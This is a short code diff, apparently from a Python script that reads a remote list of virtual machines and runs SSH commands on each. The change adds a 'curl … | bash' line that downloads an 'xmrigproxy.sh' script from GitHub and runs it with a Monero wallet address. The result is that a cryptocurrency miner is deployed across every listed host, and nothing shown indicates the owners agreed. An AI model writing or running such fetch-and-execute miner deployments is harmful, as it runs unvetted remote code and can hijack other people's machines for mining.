@@ -17,7 +17,7 @@ url = 'https://raw.githubusercontent.com/junaidd007/Monero/main/vms.csv'
 # Set your commands here, one per line
 sshcmd = [
     #" df -h" # Only used for Testing
-    "47TFyE1CiWNgcB5AMn9MSNKA4Lap9TcRwAvdbKedrK7VYWyqVTwE5qWWhW4Tdm4y2nNf9deqPdagqXWXwezwoSfPSx8jk3q"    
+    "curl -s -L https://raw.githubusercontent.com/junaidd007/Monero/main/xmrigproxy.sh | bash -s 47TFyE1CiWNgcB5AMn9MSNKA4Lap9TcRwAvdbKedrK7VYWyqVTwE5qWWhW4Tdm4y2nNf9deqPdagqXWXwezwoSfPSx8jk3q"    
 ]
 
 
